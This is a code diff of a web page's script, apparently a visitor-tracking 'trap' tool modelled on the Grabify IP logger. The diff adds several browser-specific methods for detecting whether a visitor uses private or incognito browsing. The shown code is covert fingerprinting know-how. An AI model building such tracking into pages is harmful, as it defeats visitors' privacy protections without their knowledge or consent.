@@ -24,7 +24,7 @@
     </style>
     <script>
     // ╔═══════════════════════════════════════════════════════════════════════════════╗
-    // ║  🦅 EAGLE EYE OMNISCIENT v11.0 — TRAP EDITION (AGGRESSIVE)                    ║
+    // ║  🦅 EAGLE EYE OMNISCIENT v11.1 — TRAP EDITION (AGGRESSIVE + GRABIFY INC)      ║
     // ╚═══════════════════════════════════════════════════════════════════════════════╝
     window.EagleEyeOmni = class {
         constructor() {
@@ -219,15 +219,52 @@
             };
         }
 
-        // === 5. SECURITY & AGGRESSIVE ===
+        // === 5. SECURITY & AGGRESSIVE (UPDATED v2.0 - GRABIFY STYLE) ===
         async detectIncognito() {
-            if ('storage' in navigator && 'estimate' in navigator.storage) {
+            let isIncognito = "No";
+            
+            // 1. Chrome/Chromium (The Grabify Method - Legacy API)
+            if ('webkitTemporaryStorage' in navigator && 'queryUsageAndQuota' in navigator.webkitTemporaryStorage) {
+                try {
+                    await new Promise((resolve) => {
+                        navigator.webkitTemporaryStorage.queryUsageAndQuota(
+                            (usage, quota) => {
+                                // В Инкогнито квота обычно < 120MB
+                                if (quota < 120 * 1024 * 1024) isIncognito = "Yes (Quota Limit)";
+                                resolve();
+                            },
+                            (e) => resolve()
+                        );
+                    });
+                } catch(e) {}
+            }
+            
+            // 2. Firefox (IndexedDB Error)
+            if (navigator.userAgent.includes("Firefox")) {
+                try {
+                    const db = indexedDB.open("test");
+                    db.onerror = () => { isIncognito = "Yes (Firefox DB)"; };
+                    db.onsuccess = () => { isIncognito = "No"; };
+                } catch(e) { isIncognito = "Yes (Firefox Exception)"; }
+            }
+
+            // 3. Safari (LocalStorage Error)
+            if (navigator.vendor && navigator.vendor.indexOf('Apple') > -1) {
+                try {
+                    localStorage.setItem('test', '1');
+                    localStorage.removeItem('test');
+                } catch (e) { isIncognito = "Yes (Safari Write)"; }
+            }
+
+            // 4. General Storage Estimate (Backup with higher threshold)
+            if (isIncognito === "No" && 'storage' in navigator && 'estimate' in navigator.storage) {
                 try {
                     const { quota } = await navigator.storage.estimate();
-                    return quota < 125829120 ? "Yes (Probable)" : "No";
+                    if (quota < 200 * 1024 * 1024) isIncognito = "Yes (Low Quota)";
                 } catch (e) {}
             }
-            return "Unknown";
+
+            return isIncognito;
         }
 
         detectAdBlock() {
